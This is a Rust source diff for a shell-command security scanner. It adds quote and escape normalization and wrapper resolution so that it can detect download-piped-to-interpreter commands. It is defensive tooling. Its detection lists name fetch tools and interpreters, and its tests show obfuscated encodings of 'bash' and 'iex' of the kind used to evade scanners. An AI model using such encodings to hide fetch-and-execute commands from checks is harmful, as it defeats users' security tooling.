@@ -2,6 +2,300 @@ use crate::extract::ScanContext;
 use crate::tokenize::{self, ShellType};
 use crate::verdict::{Evidence, Finding, RuleId, Severity};
 
+/// Canonical list of known interpreters (lowercase).
+/// Used by `is_interpreter()` and validated against tier-1 regex by drift test.
+pub const INTERPRETERS: &[&str] = &[
+    "sh",
+    "bash",
+    "zsh",
+    "dash",
+    "ksh",
+    "fish",
+    "csh",
+    "tcsh",
+    "ash",
+    "mksh",
+    "python",
+    "python2",
+    "python3",
+    "node",
+    "deno",
+    "bun",
+    "perl",
+    "ruby",
+    "php",
+    "lua",
+    "tclsh",
+    "elixir",
+    "rscript",
+    "pwsh",
+    "iex",
+    "invoke-expression",
+];
+
+/// Parse up to `max_digits` from `chars[*i..]` matching `predicate`, interpret as
+/// base-`radix`, and return the corresponding char. Advances `*i` past consumed digits.
+/// Zero heap allocations — uses a fixed stack buffer.
+fn parse_numeric_escape(
+    chars: &[char],
+    i: &mut usize,
+    max_digits: usize,
+    radix: u32,
+    predicate: fn(&char) -> bool,
+) -> Option<char> {
+    let mut buf = [0u8; 8];
+    let mut n = 0;
+    for _ in 0..max_digits {
+        if *i < chars.len() && predicate(&chars[*i]) {
+            buf[n] = chars[*i] as u8;
+            n += 1;
+            *i += 1;
+        } else {
+            break;
+        }
+    }
+    if n == 0 {
+        return None;
+    }
+    let s = std::str::from_utf8(&buf[..n]).ok()?;
+    let val = u32::from_str_radix(s, radix).ok()?;
+    char::from_u32(val)
+}
+
+/// Strip all shell quoting/escaping from a token, producing the effective string
+/// the shell would see after expansion.
+///
+/// Handles: single quotes, double quotes, ANSI-C quoting (`$'...'`), backslash
+/// escaping (POSIX) and backtick escaping (PowerShell).
+fn normalize_shell_token(input: &str, shell: ShellType) -> String {
+    #[derive(PartialEq)]
+    enum QState {
+        Normal,
+        Single,
+        Double,
+        AnsiC,
+    }
+
+    let chars: Vec<char> = input.chars().collect();
+    let len = chars.len();
+    let mut out = String::with_capacity(len);
+    let mut i = 0;
+    let is_ps = matches!(shell, ShellType::PowerShell);
+    let mut state = QState::Normal;
+
+    while i < len {
+        match state {
+            QState::Normal => {
+                let ch = chars[i];
+                if !is_ps && ch == '\\' && i + 1 < len {
+                    // POSIX backslash escape: skip backslash, take next char literal
+                    out.push(chars[i + 1]);
+                    i += 2;
+                } else if is_ps && ch == '`' && i + 1 < len {
+                    // PowerShell backtick escape
+                    out.push(chars[i + 1]);
+                    i += 2;
+                } else if ch == '\'' {
+                    state = QState::Single;
+                    i += 1;
+                } else if ch == '"' {
+                    state = QState::Double;
+                    i += 1;
+                } else if shell == ShellType::Posix
+                    && ch == '$'
+                    && i + 1 < len
+                    && chars[i + 1] == '\''
+                {
+                    state = QState::AnsiC;
+                    i += 2;
+                } else {
+                    out.push(ch);
+                    i += 1;
+                }
+            }
+            // SINGLE_QUOTE: everything literal until closing '
+            QState::Single => {
+                if chars[i] == '\'' {
+                    // PowerShell: '' inside single quotes is an escaped literal '
+                    if is_ps && i + 1 < len && chars[i + 1] == '\'' {
+                        out.push('\'');
+                        i += 2;
+                    } else {
+                        state = QState::Normal;
+                        i += 1;
+                    }
+                } else {
+                    out.push(chars[i]);
+                    i += 1;
+                }
+            }
+            // DOUBLE_QUOTE
+            QState::Double => {
+                if chars[i] == '"' {
+                    state = QState::Normal;
+                    i += 1;
+                } else if !is_ps && chars[i] == '\\' && i + 1 < len {
+                    // POSIX: only \", \\, \$, \` are special inside double quotes
+                    let next = chars[i + 1];
+                    if next == '"' || next == '\\' || next == '$' || next == '`' {
+                        out.push(next);
+                        i += 2;
+                    } else {
+                        // literal backslash
+                        out.push('\\');
+                        out.push(next);
+                        i += 2;
+                    }
+                } else if is_ps && chars[i] == '`' && i + 1 < len {
+                    // PowerShell backtick escape inside double quotes
+                    out.push(chars[i + 1]);
+                    i += 2;
+                } else {
+                    out.push(chars[i]);
+                    i += 1;
+                }
+            }
+            // ANSIC_QUOTE (POSIX only): decode escape sequences
+            QState::AnsiC => {
+                if chars[i] == '\'' {
+                    state = QState::Normal;
+                    i += 1;
+                } else if chars[i] == '\\' && i + 1 < len {
+                    let esc = chars[i + 1];
+                    match esc {
+                        'n' => {
+                            out.push('\n');
+                            i += 2;
+                        }
+                        't' => {
+                            out.push('\t');
+                            i += 2;
+                        }
+                        'r' => {
+                            out.push('\r');
+                            i += 2;
+                        }
+                        '\\' => {
+                            out.push('\\');
+                            i += 2;
+                        }
+                        '\'' => {
+                            out.push('\'');
+                            i += 2;
+                        }
+                        '"' => {
+                            out.push('"');
+                            i += 2;
+                        }
+                        'a' => {
+                            out.push('\x07');
+                            i += 2;
+                        }
+                        'b' => {
+                            out.push('\x08');
+                            i += 2;
+                        }
+                        'e' | 'E' => {
+                            out.push('\x1b');
+                            i += 2;
+                        }
+                        'f' => {
+                            out.push('\x0c');
+                            i += 2;
+                        }
+                        'v' => {
+                            out.push('\x0b');
+                            i += 2;
+                        }
+                        'x' => {
+                            // \xHH — 1 or 2 hex digits
+                            i += 2;
+                            if let Some(c) =
+                                parse_numeric_escape(&chars, &mut i, 2, 16, char::is_ascii_hexdigit)
+                            {
+                                out.push(c);
+                            }
+                        }
+                        'u' => {
+                            // \uHHHH — 1 to 4 hex digits
+                            i += 2;
+                            if let Some(c) =
+                                parse_numeric_escape(&chars, &mut i, 4, 16, char::is_ascii_hexdigit)
+                            {
+                                out.push(c);
+                            }
+                        }
+                        'U' => {
+                            // \UHHHHHHHH — 1 to 8 hex digits
+                            i += 2;
+                            if let Some(c) =
+                                parse_numeric_escape(&chars, &mut i, 8, 16, char::is_ascii_hexdigit)
+                            {
+                                out.push(c);
+                            }
+                        }
+                        c if c.is_ascii_digit() && c <= '7' => {
+                            // \NNN octal — 1 to 3 octal digits
+                            i += 1; // skip backslash
+                            if let Some(c) = parse_numeric_escape(&chars, &mut i, 3, 8, |c| {
+                                c.is_ascii_digit() && *c <= '7'
+                            }) {
+                                out.push(c);
+                            }
+                        }
+                        _ => {
+                            // Unknown escape: emit literal
+                            out.push('\\');
+                            out.push(esc);
+                            i += 2;
+                        }
+                    }
+                } else {
+                    out.push(chars[i]);
+                    i += 1;
+                }
+            }
+        }
+    }
+    out
+}
+
+/// Extract the effective command base name from a raw token.
+///
+/// Normalize → path basename → first word → lowercase → strip .exe
+fn normalize_cmd_base(raw: &str, shell: ShellType) -> String {
+    let normalized = normalize_shell_token(raw.trim(), shell);
+    basename_from_normalized(&normalized, shell)
+}
+
+/// Extract basename from an already-normalized (unquoted) string.
+/// Handles path separators, first-word extraction, lowercasing, and .exe stripping.
+fn basename_from_normalized(normalized: &str, shell: ShellType) -> String {
+    let has_path_sep = match shell {
+        ShellType::PowerShell => normalized.contains('/') || normalized.contains('\\'),
+        _ => normalized.contains('/'),
+    };
+    let after_path = if has_path_sep {
+        match shell {
+            ShellType::PowerShell => normalized.rsplit(['/', '\\']).next().unwrap_or(normalized),
+            _ => normalized.rsplit('/').next().unwrap_or(normalized),
+        }
+    } else {
+        normalized
+    };
+    let first_word = after_path.split_whitespace().next().unwrap_or("");
+    let lower = first_word.to_lowercase();
+    if lower.ends_with(".exe") {
+        lower[..lower.len() - 4].to_string()
+    } else {
+        lower
+    }
+}
+
+fn is_interpreter(cmd: &str) -> bool {
+    INTERPRETERS.contains(&cmd)
+}
+
 /// Run command-shape rules.
 pub fn check(
     input: &str,
@@ -18,13 +312,13 @@ pub fn check(
             || s.preceding_separator.as_deref() == Some("|&")
     });
     if has_pipe {
-        check_pipe_to_interpreter(&segments, &mut findings);
+        check_pipe_to_interpreter(&segments, shell, &mut findings);
     }
 
     // Check for insecure TLS flags in source commands
     for segment in &segments {
         if let Some(ref cmd) = segment.command {
-            let cmd_base = cmd.rsplit('/').next().unwrap_or(cmd).to_lowercase();
+            let cmd_base = normalize_cmd_base(cmd, shell);
             if is_source_command(&cmd_base) {
                 let tls_findings =
                     crate::rules::transport::check_insecure_flags(&segment.args, true);
@@ -53,139 +347,464 @@ pub fn check(
     findings
 }
 
-/// Resolve the effective interpreter from a segment.
-/// If the command is `sudo`, `env`, or an absolute path to one of them,
-/// look past flags and flag-values to find the real interpreter.
-fn resolve_interpreter_name(seg: &tokenize::Segment) -> Option<String> {
+/// Resolve the effective interpreter from a segment, handling all quoting forms,
+/// wrappers (sudo, env, command, exec, nohup), subshells, and brace groups.
+fn resolve_interpreter_name(seg: &tokenize::Segment, shell: ShellType) -> Option<String> {
     if let Some(ref cmd) = seg.command {
-        let cmd_base = cmd.rsplit('/').next().unwrap_or(cmd).to_lowercase();
+        let cmd_base = normalize_cmd_base(cmd, shell);
+
+        // Direct interpreter
         if is_interpreter(&cmd_base) {
             return Some(cmd_base);
         }
-        if cmd_base == "sudo" {
-            // Flags that take a separate value argument
-            let sudo_value_flags = ["-u", "-g", "-C", "-D", "-R", "-T"];
-            let mut skip_next = false;
-            for (idx, arg) in seg.args.iter().enumerate() {
-                if skip_next {
-                    skip_next = false;
+
+        // Subshell: (bash) → strip parens, check
+        let stripped = cmd_base.trim_start_matches('(').trim_end_matches(')');
+        if stripped != cmd_base && is_interpreter(stripped) {
+            return Some(stripped.to_string());
+        }
+
+        // Brace group: { → first arg is command
+        if cmd_base == "{" {
+            return resolve_from_args(&seg.args, shell);
+        }
+
+        // Known wrappers
+        match cmd_base.as_str() {
+            "sudo" => return resolve_sudo_args(&seg.args, shell),
+            "env" => return resolve_env_args(&seg.args, shell),
+            "command" | "exec" | "nohup" => {
+                return resolve_wrapper_args(&seg.args, &cmd_base, shell);
+            }
+            _ => {}
+        }
+    }
+    None
+}
+
+#[derive(Clone, Copy)]
+enum ResolverParser {
+    Generic,
+    Sudo,
+    Env,
+    Command,
+    Exec,
+    Nohup,
+}
+
+enum ResolveStep<'a> {
+    Found(String),
+    Next {
+        parser: ResolverParser,
+        args: &'a [String],
+        inspected: usize,
+    },
+    Stop,
+}
+
+/// Resolve interpreter from a generic arg list. Uses an iterative parser with a
+/// token-inspection budget so deeply nested wrappers cannot bypass detection.
+fn resolve_from_args(args: &[String], shell: ShellType) -> Option<String> {
+    resolve_with_parser(args, shell, ResolverParser::Generic)
+}
+
+fn resolve_sudo_args(args: &[String], shell: ShellType) -> Option<String> {
+    resolve_with_parser(args, shell, ResolverParser::Sudo)
+}
+
+fn resolve_env_args(args: &[String], shell: ShellType) -> Option<String> {
+    resolve_with_parser(args, shell, ResolverParser::Env)
+}
+
+fn resolve_wrapper_args(args: &[String], wrapper: &str, shell: ShellType) -> Option<String> {
+    let parser = match wrapper {
+        "command" => ResolverParser::Command,
+        "exec" => ResolverParser::Exec,
+        "nohup" => ResolverParser::Nohup,
+        _ => ResolverParser::Command,
+    };
+    resolve_with_parser(args, shell, parser)
+}
+
+fn resolve_with_parser(
+    args: &[String],
+    shell: ShellType,
+    start_parser: ResolverParser,
+) -> Option<String> {
+    if args.is_empty() {
+        return None;
+    }
+
+    let mut parser = start_parser;
+    let mut current = args;
+    // Budget scales with input size and keeps resolution bounded even on adversarial inputs.
+    let mut budget = args.len().saturating_mul(4).saturating_add(8);
+
+    while budget > 0 && !current.is_empty() {
+        let step = match parser {
+            ResolverParser::Generic => resolve_step_generic(current, shell),
+            ResolverParser::Sudo => resolve_step_sudo(current, shell),
+            ResolverParser::Env => resolve_step_env(current, shell),
+            ResolverParser::Command => resolve_step_wrapper(current, shell, "command"),
+            ResolverParser::Exec => resolve_step_wrapper(current, shell, "exec"),
+            ResolverParser::Nohup => resolve_step_wrapper(current, shell, "nohup"),
+        };
+
+        match step {
+            ResolveStep::Found(interpreter) => return Some(interpreter),
+            ResolveStep::Stop => return None,
+            ResolveStep::Next {
+                parser: next_parser,
+                args: next_args,
+                inspected,
+            } => {
+                parser = next_parser;
+                current = next_args;
+                budget = budget.saturating_sub(inspected.max(1));
+            }
+        }
+    }
+    None
+}
+
+fn resolve_step_generic<'a>(args: &'a [String], shell: ShellType) -> ResolveStep<'a> {
+    let mut idx = 0;
+    let mut seen_dashdash = false;
+    while idx < args.len() {
+        let raw = args[idx].trim();
+        let normalized = normalize_shell_token(raw, shell);
+
+        // Track end-of-options marker
+        if normalized == "--" {
+            seen_dashdash = true;
+            idx += 1;
+            continue;
+        }
+
+        // Skip flags and assignments (only before --)
+        if !seen_dashdash
+            && (normalized.starts_with("--")
+                || normalized.starts_with('-')
+                || normalized.contains('='))
+        {
+            idx += 1;
+            continue;
+        }
+
+        let base = basename_from_normalized(&normalized, shell);
+        return match base.as_str() {
+            "sudo" => ResolveStep::Next {
+                parser: ResolverParser::Sudo,
+                args: &args[idx + 1..],
+                inspected: idx + 1,
+            },
+            "env" => ResolveStep::Next {
+                parser: ResolverParser::Env,
+                args: &args[idx + 1..],
+                inspected: idx + 1,
+            },
+            "command" => ResolveStep::Next {
+                parser: ResolverParser::Command,
+                args: &args[idx + 1..],
+                inspected: idx + 1,
+            },
+            "exec" => ResolveStep::Next {
+                parser: ResolverParser::Exec,
+                args: &args[idx + 1..],
+                inspected: idx + 1,
+            },
+            "nohup" => ResolveStep::Next {
+                parser: ResolverParser::Nohup,
+                args: &args[idx + 1..],
+                inspected: idx + 1,
+            },
+            _ if is_interpreter(&base) => ResolveStep::Found(base),
+            _ => ResolveStep::Stop,
+        };
+    }
+    ResolveStep::Stop
+}
+
+fn resolve_step_sudo<'a>(args: &'a [String], shell: ShellType) -> ResolveStep<'a> {
+    let value_short_flags = ["-u", "-g", "-C", "-D", "-R", "-T"];
+    let value_long_flags = [
+        "--user",
+        "--group",
+        "--close-from",
+        "--chdir",
+        "--role",
+        "--type",
+        "--other-user",
+        "--host",
+        "--timeout",
+    ];
+
+    let mut idx = 0;
+    while idx < args.len() {
+        let raw = args[idx].trim();
+        let normalized = normalize_shell_token(raw, shell);
+        // -- ends option parsing; remaining args are the command
+        if normalized == "--" {
+            return ResolveStep::Next {
+                parser: ResolverParser::Generic,
+                args: &args[(idx + 1).min(args.len())..],
+                inspected: idx + 1,
+            };
+        }
+        if normalized.starts_with("--") {
+            if value_long_flags.iter().any(|f| normalized == *f) {
+                idx += 2;
+                continue;
+            }
+            if let Some((key, _)) = normalized.split_once('=') {
+                if value_long_flags.contains(&key) {
+                    idx += 1;
                     continue;
                 }
-                let trimmed = arg.trim();
-                if trimmed.starts_with("--") {
-                    // --user=root: long flag with =, skip entirely
-                    // --user root: long flag without =, skip next arg
-                    if !trimmed.contains('=') {
-                        skip_next = true;
+            }
+            // Unknown long flag: treat as boolean.
+            idx += 1;
+            continue;
+        }
+        if normalized.starts_with('-') {
+            if value_short_flags.iter().any(|f| normalized == *f) {
+                // Exact match: e.g. -u → next arg is the value
+                idx += 2;
+            } else if normalized.len() > 2
+                && value_short_flags.iter().any(|f| {
+                    normalized.ends_with(&f[1..]) // last char matches value-flag letter
+                })
+            {
+                // Combined short flags: e.g. -iu → -i + -u, last flag takes a value
+                idx += 2;
+            } else {
+                idx += 1;
+            }
+            continue;
+        }
+        return ResolveStep::Next {
+            parser: ResolverParser::Generic,
+            args: &args[idx..],
+            inspected: idx + 1,
+        };
+    }
+    ResolveStep::Stop
+}
+
+fn resolve_step_env<'a>(args: &'a [String], shell: ShellType) -> ResolveStep<'a> {
+    let value_short_flags = ["-u", "-C"];
+    let value_long_flags = [
+        "--unset",
+        "--chdir",
+        "--split-string",
+        "--block-signal",
+        "--default-signal",
+        "--ignore-signal",
+    ];
+
+    let mut idx = 0;
+    while idx < args.len() {
+        let raw = args[idx].trim();
+        let normalized = normalize_shell_token(raw, shell);
+        // -- ends option parsing; remaining args are the command
+        if normalized == "--" {
+            return ResolveStep::Next {
+                parser: ResolverParser::Generic,
+                args: &args[(idx + 1).min(args.len())..],
+                inspected: idx + 1,
+            };
+        }
+        if normalized.starts_with("--") {
+            // --split-string: value is a command string.
+            if normalized == "--split-string" {
+                if idx + 1 < args.len() {
+                    let base = normalize_cmd_base(&args[idx + 1], shell);
+                    if is_interpreter(&base) {
+                        return ResolveStep::Found(base);
                     }
-                    continue;
                 }
-                if trimmed.starts_with('-') {
-                    if sudo_value_flags.contains(&trimmed) {
-                        skip_next = true;
-                    }
-                    continue;
-                }
-                let base = trimmed.rsplit('/').next().unwrap_or(trimmed).to_lowercase();
-                if base == "env" {
-                    return resolve_env_from_args(&seg.args[idx + 1..]);
-                }
+                idx += 2;
+                continue;
+            }
+            if let Some(val) = normalized.strip_prefix("--split-string=") {
+                let base = normalize_cmd_base(val, shell);
                 if is_interpreter(&base) {
-                    return Some(base);
+                    return ResolveStep::Found(base);
                 }
-                break;
+                idx += 1;
+                continue;
             }
-        } else if cmd_base == "env" {
-            return resolve_env_from_args(&seg.args);
+            if value_long_flags.iter().any(|f| normalized == *f) {
+                idx += 2;
+                continue;
+            }
+            if let Some((key, _)) = normalized.split_once('=') {
+                if value_long_flags.contains(&key) {
+                    idx += 1;
+                    continue;
+                }
+            }
+            // Unknown long flag: treat as boolean.
+            idx += 1;
+            continue;
         }
+        if normalized == "-S" {
+            // -S: value is a command string.
+            if idx + 1 < args.len() {
+                let base = normalize_cmd_base(&args[idx + 1], shell);
+                if is_interpreter(&base) {
+                    return ResolveStep::Found(base);
+                }
+            }
+            idx += 2;
+            continue;
+        }
+        if normalized.starts_with('-') {
+            if value_short_flags.iter().any(|f| normalized == *f) {
+                idx += 2;
+            } else {
+                idx += 1;
+            }
+            continue;
+        }
+        if normalized.contains('=') {
+            idx += 1;
+            continue;
+        }
+        return ResolveStep::Next {
+            parser: ResolverParser::Generic,
+            args: &args[idx..],
+            inspected: idx + 1,
+        };
     }
-    None
+    ResolveStep::Stop
 }
 
-fn resolve_env_from_args(args: &[String]) -> Option<String> {
-    let env_value_flags = ["-u", "-C"];
-    let mut skip_next = false;
-    for arg in args {
-        if skip_next {
-            skip_next = false;
-            continue;
+fn resolve_step_wrapper<'a>(
+    args: &'a [String],
+    shell: ShellType,
+    wrapper: &str,
+) -> ResolveStep<'a> {
+    let value_flags: &[&str] = match wrapper {
+        "exec" => &["-a"],
+        _ => &[],
+    };
+
+    let mut idx = 0;
+    while idx < args.len() {
+        let raw = args[idx].trim();
+        let normalized = normalize_shell_token(raw, shell);
+        // -- ends option parsing; remaining args are the command
+        if normalized == "--" {
+            return ResolveStep::Next {
+                parser: ResolverParser::Generic,
+                args: &args[(idx + 1).min(args.len())..],
+                inspected: idx + 1,
+            };
         }
-        let trimmed = arg.trim();
-        if trimmed.starts_with("--") {
-            if !trimmed.contains('=') {
-                skip_next = true;
+        if normalized.starts_with("--") || normalized.starts_with('-') {
+            if value_flags.iter().any(|f| normalized == *f) {
+                idx += 2;
+            } else {
+                idx += 1;
             }
             continue;
         }
-        if trimmed.starts_with('-') {
-            if env_value_flags.contains(&trimmed) {
-                skip_next = true;
-            }
-            continue;
-        }
-        // VAR=val assignments
-        if trimmed.contains('=') {
-            continue;
-        }
-        let base = trimmed.rsplit('/').next().unwrap_or(trimmed).to_lowercase();
-        if is_interpreter(&base) {
-            return Some(base);
-        }
-        break;
+        return ResolveStep::Next {
+            parser: ResolverParser::Generic,
+            args: &args[idx..],
+            inspected: idx + 1,
+        };
     }
-    None
+    ResolveStep::Stop
 }
 
-fn check_pipe_to_interpreter(segments: &[tokenize::Segment], findings: &mut Vec<Finding>) {
+fn check_pipe_to_interpreter(
+    segments: &[tokenize::Segment],
+    shell: ShellType,
+    findings: &mut Vec<Finding>,
+) {
     for (i, seg) in segments.iter().enumerate() {
         if i == 0 {
             continue;
         }
         if let Some(sep) = &seg.preceding_separator {
             if sep == "|" || sep == "|&" {
-                if let Some(interpreter) = resolve_interpreter_name(seg) {
-                    // Find the source segment
-                    if i > 0 {
-                        let source = &segments[i - 1];
-                        let source_cmd = source.command.as_deref().unwrap_or("unknown").to_string();
-                        let source_base = source_cmd
-                            .rsplit('/')
-                            .next()
-                            .unwrap_or(&source_cmd)
-                            .to_lowercase();
+                if let Some(interpreter) = resolve_interpreter_name(seg, shell) {
+                    // i > 0 is guaranteed — the loop skips i == 0 above.
+                    let source = &segments[i - 1];
+                    let source_cmd_ref = source.command.as_deref().unwrap_or("unknown");
+                    let source_base = normalize_cmd_base(source_cmd_ref, shell);
 
-                        // Skip if the source is tirith itself — its output is trusted.
-                        if source_base == "tirith" {
-                            continue;
-                        }
-
-                        let rule_id = match source_base.as_str() {
-                            "curl" => RuleId::CurlPipeShell,
-                            "wget" => RuleId::WgetPipeShell,
-                            "http" | "https" => RuleId::HttpiePipeShell,
-                            "xh" => RuleId::XhPipeShell,
-                            _ => RuleId::PipeToInterpreter,
-                        };
-
-                        let display_cmd = seg.command.as_deref().unwrap_or(&interpreter);
-
-                        findings.push(Finding {
-                                rule_id,
-                                severity: Severity::High,
-                                title: format!("Pipe to interpreter: {source_cmd} | {display_cmd}"),
-                                description: format!(
-                                    "Command pipes output from '{source_base}' directly to interpreter '{interpreter}'. Downloaded content will be executed without inspection."
-                                ),
-                                evidence: vec![Evidence::CommandPattern {
-                                    pattern: "pipe to interpreter".to_string(),
-                                    matched: format!("{} | {}", source.raw, seg.raw),
-                                }],
-                                human_view: None,
-                                agent_view: None,
-                mitre_id: None,
-                custom_rule_id: None,
-                            });
+                    // Skip if the source is tirith itself — its output is trusted.
+                    if source_base == "tirith" {
+                        continue;
                     }
+
+                    let rule_id = match source_base.as_str() {
+                        "curl" => RuleId::CurlPipeShell,
+                        "wget" => RuleId::WgetPipeShell,
+                        "http" | "https" => RuleId::HttpiePipeShell,
+                        "xh" => RuleId::XhPipeShell,
+                        _ => RuleId::PipeToInterpreter,
+                    };
+
+                    let display_cmd = seg.command.as_deref().unwrap_or(&interpreter);
+
+                    let base_desc = format!(
+                        "Command pipes output from '{source_base}' directly to \
+                         interpreter '{interpreter}'. Downloaded content will be \
+                         executed without inspection."
+                    );
+
+                    let description = if is_url_fetch_command(&source_base) {
+                        let show_tirith_run = cfg!(unix)
+                            && supports_tirith_run_hint(&source_base)
+                            && shell != ShellType::PowerShell;
+                        if let Some(url) = extract_url_from_args(&source.args, shell)
+                            .map(|u| sanitize_url_for_display(&u))
+                        {
+                            if show_tirith_run {
+                                format!(
+                                    "{base_desc}\n  Safer: tirith run {url}  \
+                                     \u{2014} or: vet {url}  (https://getvet.sh)"
+                                )
+                            } else {
+                                format!(
+                                    "{base_desc}\n  Safer: vet {url}  \
+                                     (https://getvet.sh)"
+                                )
+                            }
+                        } else if show_tirith_run {
+                            format!(
+                                "{base_desc}\n  Safer: use 'tirith run <url>' \
+                                 or 'vet <url>' (https://getvet.sh) to inspect \
+                                 before executing."
+                            )
+                        } else {
+                            format!(
+                                "{base_desc}\n  Safer: use 'vet <url>' \
+                                 (https://getvet.sh) to inspect before executing."
+                            )
+                        }
+                    } else {
+                        base_desc
+                    };
+
+                    findings.push(Finding {
+                        rule_id,
+                        severity: Severity::High,
+                        title: format!("Pipe to interpreter: {source_cmd_ref} | {display_cmd}"),
+                        description,
+                        evidence: vec![Evidence::CommandPattern {
+                            pattern: "pipe to interpreter".to_string(),
+                            matched: format!("{} | {}", source.raw, seg.raw),
+                        }],
+                        human_view: None,
+                        agent_view: None,
+                        mitre_id: None,
+                        custom_rule_id: None,
+                    });
                 }
             }
         }
@@ -651,40 +1270,65 @@ fn is_private_ip(host: &str) -> bool {
     false
 }
 
+/// POSIX fetch commands — appropriate for both `tirith run` and `vet` hints.
+const POSIX_FETCH_COMMANDS: &[&str] = &["curl", "wget", "http", "https", "xh", "fetch"];
+
+/// PowerShell fetch commands — appropriate for `vet` hints only
+/// (`tirith run` doesn't support PowerShell interpreter flows).
+const POWERSHELL_FETCH_COMMANDS: &[&str] =
+    &["iwr", "irm", "invoke-webrequest", "invoke-restmethod"];
+
+/// Source commands that are not URL-fetching (no vet/tirith-run hints).
+const NON_FETCH_SOURCE_COMMANDS: &[&str] = &["scp", "rsync"];
+
 fn is_source_command(cmd: &str) -> bool {
-    matches!(
-        cmd,
-        "curl"
-            | "wget"
-            | "http"
-            | "https"
-            | "xh"
-            | "fetch"
-            | "scp"
-            | "rsync"
-            | "iwr"
-            | "irm"
-            | "invoke-webrequest"
-            | "invoke-restmethod"
-    )
+    POSIX_FETCH_COMMANDS.contains(&cmd)
+        || POWERSHELL_FETCH_COMMANDS.contains(&cmd)
+        || NON_FETCH_SOURCE_COMMANDS.contains(&cmd)
 }
 
-fn is_interpreter(cmd: &str) -> bool {
-    matches!(
-        cmd,
-        "sh" | "bash"
-            | "zsh"
-            | "dash"
-            | "ksh"
-            | "python"
-            | "python3"
-            | "node"
-            | "perl"
-            | "ruby"
-            | "php"
-            | "iex"
-            | "invoke-expression"
-    )
+/// All URL-fetching commands (union of POSIX + PowerShell).
+fn is_url_fetch_command(cmd: &str) -> bool {
+    POSIX_FETCH_COMMANDS.contains(&cmd) || POWERSHELL_FETCH_COMMANDS.contains(&cmd)
+}
+
+/// Whether this fetch source supports `tirith run` hints.
+/// True only for POSIX fetch commands (`tirith run` is a shell-script runner).
+fn supports_tirith_run_hint(cmd: &str) -> bool {
+    POSIX_FETCH_COMMANDS.contains(&cmd)
+}
+
+/// Check if string starts with http:// or https:// (case-insensitive scheme).
+fn starts_with_http_scheme(s: &str) -> bool {
+    let b = s.as_bytes();
+    (b.len() >= 8 && b[..8].eq_ignore_ascii_case(b"https://"))
+        || (b.len() >= 7 && b[..7].eq_ignore_ascii_case(b"http://"))
+}
+
+/// Strip control characters (0x00–0x1F, 0x7F) from a URL so it cannot inject
+/// ANSI escapes, newlines, or other terminal-interpreted sequences into the
+/// finding description displayed to the user.
+fn sanitize_url_for_display(url: &str) -> String {
+    url.chars().filter(|&c| !c.is_ascii_control()).collect()
+}
+
+/// Extract the first URL from command arguments.
+fn extract_url_from_args(args: &[String], shell: ShellType) -> Option<String> {
+    for arg in args {
+        let normalized = normalize_shell_token(arg.trim(), shell);
+
+        if starts_with_http_scheme(&normalized) {
+            return Some(normalized);
+        }
+
+        // Check --flag=<url> forms (e.g., --url=https://...)
+        if let Some((_, val)) = normalized.split_once('=') {
+            if starts_with_http_scheme(val) {
+                return Some(val.to_string());
+            }
+        }
+    }
+    None
 }
 
 /// Check command destination hosts against policy network deny/allow lists (Team feature).
@@ -1430,6 +2074,518 @@ mod tests {
         assert!(
             f2.iter().any(|f| f.rule_id == RuleId::VetNotConfigured),
             "should detect CARGO.EXE case-insensitively"
+        );
+    }
+
+    // ── normalize_shell_token unit tests ──
+
+    #[test]
+    fn test_normalize_ansi_c_basic() {
+        assert_eq!(normalize_shell_token("$'bash'", ShellType::Posix), "bash");
+    }
+
+    #[test]
+    fn test_normalize_ansi_c_hex() {
+        assert_eq!(
+            normalize_shell_token("$'\\x62\\x61\\x73\\x68'", ShellType::Posix),
+            "bash"
+        );
+    }
+
+    #[test]
+    fn test_normalize_ansi_c_octal() {
+        assert_eq!(
+            normalize_shell_token("$'\\142\\141\\163\\150'", ShellType::Posix),
+            "bash"
+        );
+    }
+
+    #[test]
+    fn test_normalize_ansi_c_octal_leading_zero() {
+        // \057 = '/' (octal 057 = 47 decimal = '/')
+        assert_eq!(
+            normalize_shell_token("$'\\057bin\\057bash'", ShellType::Posix),
+            "/bin/bash"
+        );
+    }
+
+    #[test]
+    fn test_normalize_ansi_c_bare_zero() {
+        // \0 alone (no following octal digits) should still be NUL
+        assert_eq!(normalize_shell_token("$'a\\0b'", ShellType::Posix), "a\0b");
+    }
+
+    #[test]
+    fn test_normalize_ansi_c_unicode() {
+        assert_eq!(
+            normalize_shell_token("$'\\u0062ash'", ShellType::Posix),
+            "bash"
+        );
+    }
+
+    #[test]
+    fn test_normalize_double_quotes() {
+        assert_eq!(normalize_shell_token("\"bash\"", ShellType::Posix), "bash");
+    }
+
+    #[test]
+    fn test_normalize_single_quotes() {
+        assert_eq!(normalize_shell_token("'bash'", ShellType::Posix), "bash");
+    }
+
+    #[test]
+    fn test_normalize_backslash() {
+        assert_eq!(normalize_shell_token("ba\\sh", ShellType::Posix), "bash");
+    }
+
+    #[test]
+    fn test_normalize_empty_concat() {
+        assert_eq!(normalize_shell_token("ba''sh", ShellType::Posix), "bash");
+    }
+
+    #[test]
+    fn test_normalize_mixed_concat() {
+        assert_eq!(normalize_shell_token("'ba'sh", ShellType::Posix), "bash");
+    }
+
+    #[test]
+    fn test_normalize_powershell_backtick() {
+        assert_eq!(
+            normalize_shell_token("`i`e`x", ShellType::PowerShell),
+            "iex"
+        );
+    }
+
+    #[test]
+    fn test_normalize_unclosed_single_quote() {
+        // Unclosed quote: everything after ' is literal, state ends in SINGLE_QUOTE
+        let result = normalize_shell_token("'bash", ShellType::Posix);
+        assert_eq!(result, "bash");
+    }
+
+    #[test]
+    fn test_normalize_unclosed_double_quote() {
+        let result = normalize_shell_token("\"bash", ShellType::Posix);
+        assert_eq!(result, "bash");
+    }
+
+    // ── normalize_cmd_base unit tests ──
+
+    #[test]
+    fn test_cmd_base_path() {
+        assert_eq!(
+            normalize_cmd_base("/usr/bin/bash", ShellType::Posix),
+            "bash"
+        );
+    }
+
+    #[test]
+    fn test_cmd_base_ansi_c() {
+        assert_eq!(normalize_cmd_base("$'bash'", ShellType::Posix), "bash");
+    }
+
+    #[test]
+    fn test_cmd_base_exe() {
+        assert_eq!(normalize_cmd_base("bash.exe", ShellType::Posix), "bash");
+    }
+
+    #[test]
+    fn test_cmd_base_uppercase() {
+        assert_eq!(normalize_cmd_base("BASH", ShellType::Posix), "bash");
+    }
+
+    #[test]
+    fn test_cmd_base_powershell_path() {
+        assert_eq!(
+            normalize_cmd_base(r"C:\Git\bin\bash.exe", ShellType::PowerShell),
+            "bash"
+        );
+    }
+
+    #[test]
+    fn test_cmd_base_encoded_path() {
+        // $'\x2fusr\x2fbin\x2fbash' → /usr/bin/bash → basename bash
+        assert_eq!(
